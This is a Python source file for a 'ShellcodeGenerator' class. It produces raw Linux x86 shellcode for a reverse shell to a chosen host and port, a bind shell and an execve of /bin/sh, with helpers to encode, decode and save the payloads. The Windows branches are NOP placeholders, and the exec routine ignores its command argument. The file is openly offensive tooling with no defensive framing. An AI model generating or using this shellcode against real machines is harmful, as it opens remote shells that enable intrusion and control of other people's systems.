import platform
import logging
import struct
import socket
import base64
import binascii
from datetime import datetime

class ShellcodeGenerator:
    def __init__(self):
        self.os_type = platform.system()
        self.setup_logging()

    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('shellcode.log'),
                logging.StreamHandler()
            ]
        )

    def generate_reverse_shell(self, host, port, platform='windows'):
        try:
            port = int(port)
            host = host.strip()

            if platform == 'windows':
                shellcode = b"\x90" * 100  # Placeholder for actual Windows shellcode
            else:
                shellcode = (
                    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6"
                    b"\xb0\x66\xb3\x03\x68" + socket.inet_aton(host) +
                    b"\x66\x68" + struct.pack(">H", port) +
                    b"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x02\x89\xf3\xb0\x3f\xcd\x80\x49\x79"
                    b"\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
                )
            return shellcode
        except Exception as e:
            logging.error(f"Error generating reverse shell: {str(e)}")
            return None

    def generate_bind_shell(self, port, platform='windows'):
        try:
            port = int(port)

            if platform == 'windows':
                shellcode = b"\x90" * 100  # Placeholder for actual Windows bind shell
            else:
                shellcode = (
                    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6"
                    b"\xb0\x66\xb3\x02\x31\xc9\x51\x66\x68" + struct.pack(">H", port) +
                    b"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80"
                    b"\xb0\x66\xb3\x05\x31\xc9\x51\x51\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79"
                    b"\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
                )
            return shellcode
        except Exception as e:
            logging.error(f"Error generating bind shell: {str(e)}")
            return None

    def generate_exec(self, command, platform='windows'):
        try:
            if platform == 'windows':
                shellcode = b"\x90" * 100  # Placeholder for actual Windows exec
            else:
                shellcode = (
                    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
                    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
                    b"\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
                )
            return shellcode
        except Exception as e:
            logging.error(f"Error generating exec shellcode: {str(e)}")
            return None

    def encode_shellcode(self, shellcode, encoding='base64'):
        try:
            if encoding == 'base64':
                return base64.b64encode(shellcode)
            elif encoding == 'hex':
                return binascii.hexlify(shellcode)
            elif encoding == 'ascii':
                return ''.join([f"\\x{byte:02x}" for byte in shellcode])
            else:
                raise ValueError(f"Unsupported encoding: {encoding}")
        except Exception as e:
            logging.error(f"Error encoding shellcode: {str(e)}")
            return None

    def decode_shellcode(self, encoded_shellcode, encoding='base64'):
        try:
            if encoding == 'base64':
                return base64.b64decode(encoded_shellcode)
            elif encoding == 'hex':
                return binascii.unhexlify(encoded_shellcode)
            elif encoding == 'ascii':
                return bytes.fromhex(encoded_shellcode.replace('\\x', ''))
            else:
                raise ValueError(f"Unsupported encoding: {encoding}")
        except Exception as e:
            logging.error(f"Error decoding shellcode: {str(e)}")
            return None

    def save_shellcode(self, shellcode, filename=None):
        try:
            if filename is None:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"shellcode_{timestamp}.bin"
            with open(filename, 'wb') as f:
                f.write(shellcode)
            logging.info(f"Saved shellcode to {filename}")
            return filename
        except Exception as e:
            logging.error(f"Error saving shellcode: {str(e)}")
            return None
